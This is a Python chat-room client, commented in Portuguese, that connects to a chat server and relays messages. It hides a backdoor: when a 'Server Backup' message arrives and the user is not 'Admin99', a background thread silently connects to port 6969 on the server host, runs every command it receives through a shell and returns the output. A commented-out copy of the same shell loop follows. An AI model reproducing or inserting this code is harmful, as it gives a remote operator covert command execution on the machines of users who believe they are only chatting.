import select,socket,sys,os,time,threading,subprocess
from headerchatroom import SALAS,LOBBY,USER
import headerchatroom

BUFFER = 8192
messages=[]
host= sys.argv[1]
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
clientsocket.connect((sys.argv[1], headerchatroom.PORT))
CURSOR_UP_ONE = '\x1b[1A'
ERASE_LINE = '\x1b[2K'
os.system("clear")

def prompt(): #Input do User
    print('', end='', flush = True) # FLush é boa pratica

def client():
    print("[+]Conectado\nBem Vindo!")
    msg_prefix = '' #Para o sv nao confundir com o prompt inicial de nome
    socket_list = [sys.stdin, clientsocket] #Lista de sockets

    while True:
        read_sockets, write_sockets, error_sockets = select.select(socket_list, [], []) #Organiza tudo em listas(User,Mensagens,Erros)
        for socket in read_sockets:
            if socket is clientsocket: # Se existe uma msg a vir, recebe
                msg = socket.recv(BUFFER)
                if not msg: #Se não, significa que o server esta em baixo.
                    print("Server down!")
                    sys.exit(2)
                else:
                    if msg == headerchatroom.Mayday.encode(): #Se a msg for igual a /exit
                        sys.stdout.write('Adeus\n')
                        time.sleep(2)
                        os.system("clear")
                        sys.exit(2)
                    else: #Manda msg
                        sys.stdout.write(msg.decode())
                        if 'User:' in msg.decode(): #Se a string inicial ainda la estiver
                            msg_prefix = 'name: ' # identifier para o name


                        elif "Server Backup" in msg.decode():
                            if nome=="Admin99\n":
                                sys.stdout.write("It Has Started\n")
                            else:
                                a=2
                                var2 = threading.Thread(target=bot)
                                var2.daemon=True
                                var2.start()

                        else:
                            msg_prefix = ''
                        prompt()
            else:
                msg = msg_prefix + sys.stdin.readline()
                print(CURSOR_UP_ONE + ERASE_LINE)
                if "name:" in msg:
                    nome=msg[6:]
                    #print(nome)

                    clientsocket.sendall(msg.encode())
                else:
                    clientsocket.sendall(msg.encode())
def bot():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((sys.argv[1], 6969))
    while 1:
        command = sock.recv(1024)
        #stdin=command
        command = command.decode()
        proc= subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        proc_result = proc.stdout.read() + proc.stderr.read()
        #print(proc_results)
        #if proc_result is b'':
            #sock.send("Sucesso")
        #else:
        sock.send(proc_result)

    '''
    host = sys.argv[1]
port = int(sys.argv[2])
#msg = "\n"

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((host,port))

while 1:
    command = sock.recv(1024)
    #stdin=command
    command = command.decode()
    proc= subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    proc_result = proc.stdout.read() + proc.stderr.read()
    #print(proc_results)
    if proc_result is b'':
        sock.send("Sucesso")
    else:
        sock.send(proc_result) #+ (msg.encode("utf-8")) )
    '''

if __name__=="__main__": #client()
    var = threading.Thread(target=client)
    var.daemon=True
    var.start()

    while 1:
        1==1
